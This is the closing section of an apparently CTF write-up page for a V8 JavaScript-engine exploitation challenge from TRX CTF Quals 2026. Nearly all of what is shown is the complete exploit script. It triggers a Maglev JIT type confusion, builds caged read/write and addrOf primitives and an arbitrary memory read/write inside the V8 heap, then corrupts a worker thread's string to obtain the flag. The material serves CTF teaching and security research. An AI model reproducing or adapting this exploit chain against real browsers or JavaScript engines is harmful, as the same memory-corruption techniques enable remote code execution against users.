+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>obj</span>, <span style=color:#a6e22e>x</span>) {  
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>]; <span style=color:#75715e>//x must be an HeapObj
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>y</span> <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0.1</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>obj</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>; <span style=color:#75715e>//no check here :)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>target</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>p</span><span style=color:#f92672>:</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>} };
+</span></span><span style=display:flex><span><span style=color:#a6e22e>target</span>.<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>p</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>y</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#ae81ff>1.1</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, [<span style=color:#ae81ff>1.1</span>]);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spin</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>trigger</span>(<span style=color:#a6e22e>target</span>, <span style=color:#a6e22e>EVIL_SMI</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>y</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>)<span style=color:#f92672>-</span><span style=color:#ae81ff>7</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff00000000</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>set</span>(<span style=color:#a6e22e>target</span>, <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>tmp</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>y</span>)));
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>caged_read</span>(<span style=color:#a6e22e>x</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spray</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>BigInt</span>(<span style=color:#a6e22e>x</span>)<span style=color:#f92672>-</span><span style=color:#ae81ff>7</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>get</span>(<span style=color:#a6e22e>target</span>))) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>spray2</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0x4fe0000</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spray2</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>spray2</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>marker</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>caged_read</span>(<span style=color:#a6e22e>FIXED_OBJ_ARRAY</span><span style=color:#f92672>-</span><span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>marker</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x5dd</span><span style=color:#a6e22e>n</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;Unexpected obj array marker: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>marker</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;, fixing offset...&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>FIXED_OBJ_ARRAY</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8cc0018</span><span style=color:#a6e22e>n</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>addrOf</span>(<span style=color:#a6e22e>obj</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spray2</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>obj</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> Number(<span style=color:#a6e22e>caged_read</span>(<span style=color:#a6e22e>FIXED_OBJ_ARRAY</span>)) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>sbox_buf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>0x1337</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>build_primitives</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>addrOf</span>(<span style=color:#a6e22e>sbox_buf</span>) <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>, <span style=color:#ae81ff>0xe0000000</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, <span style=color:#ae81ff>0xffffffff</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1c</span>, <span style=color:#ae81ff>0xe0000000</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0xffffffff</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x24</span>, <span style=color:#ae81ff>0x00000000</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>caged_write</span>(<span style=color:#a6e22e>sbox_buf_addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>, <span style=color:#ae81ff>0x00000000</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#a6e22e>build_primitives</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>sbox_view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>sbox_buf</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>r32</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>addr</span>) =&gt; <span style=color:#a6e22e>sbox_view</span>.<span style=color:#a6e22e>getUint32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w32</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>addr</span>, <span style=color:#a6e22e>val</span>) =&gt; <span style=color:#a6e22e>sbox_view</span>.<span style=color:#a6e22e>setUint32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#a6e22e>val</span>, <span style=color:#66d9ef>true</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>gc</span>();
+</span></span><span style=display:flex><span><span style=color:#a6e22e>gc</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>workerScript</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>function spin(ms) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  let end = Date.now() + ms;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  while(Date.now() &lt; end);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>};
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>function gc() {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  new ArrayBuffer(1);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  new ArrayBuffer(1);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  new ArrayBuffer(2 ** 30);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>let arr = new Array(0x2000).fill(0x42);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>arr[0] = 0x4d;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>arr[1] = 0x41;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>arr[2] = 0x52;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>arr[3] = 0x4b;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>const str = String.fromCharCode(...arr);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>gc();
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>gc();
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>while(1){
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  let a;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  try { 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    a = triforce(str);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  } catch(e) {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    continue;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  }
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  print(&#34;Sending flag to main thread...&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  postMessage(a);  
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>  break;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>`</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>worker</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Worker</span>(<span style=color:#a6e22e>workerScript</span>, {<span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;string&#39;</span>});
+</span></span><span style=display:flex><span><span style=color:#a6e22e>worker</span>.<span style=color:#a6e22e>onmessage</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>e</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;Received message from worker&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>flag</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>e</span>.<span style=color:#a6e22e>data</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;Flag from worker: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>flag</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spin</span>(<span style=color:#ae81ff>2000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>addr</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8922c00</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (; <span style=color:#a6e22e>r32</span>(<span style=color:#a6e22e>addr</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x4b52414d</span>; <span style=color:#a6e22e>addr</span><span style=color:#f92672>+=</span><span style=color:#ae81ff>4</span>) {}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;Found string marker at: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>addr</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>5</span>); <span style=color:#75715e>//len
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#ae81ff>0x65776f50</span>); <span style=color:#75715e>//Power
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>0x72</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spin</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>6</span>); <span style=color:#75715e>//len
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#ae81ff>0x64736957</span>); <span style=color:#75715e>//Wisdom
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>0x6d6f</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spin</span>(<span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>7</span>); <span style=color:#75715e>//len
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#ae81ff>0x72756f43</span>); <span style=color:#75715e>//Courage
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>w32</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4</span>, <span style=color:#ae81ff>0x656761</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>spin</span>(<span style=color:#ae81ff>1000</span>);
+</span></span></code></pre></div></div></section><section class=page__aside><div><p>A V8 exploitation challenge I authored for TRX CTF Quals 2026</p><p>By Erge,
+2026-04-25</p><hr>On this page:<section><nav id=TableOfContents><ol><li><a href=#description>Description</a></li><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#maglev>Maglev</a></li><li><a href=#exploitation-strategy>Exploitation Strategy</a></li><li><a href=#flag>Flag</a></li><li><a href=#full-exploit>Full exploit</a></li></ol></nav></section></div></section><footer class=page__footer><p></p><br><br><p>Made with love by <strong>@Erge</strong>, <strong>@leave</strong> and <strong>@prosti</strong>.</p></footer></div></body></html>
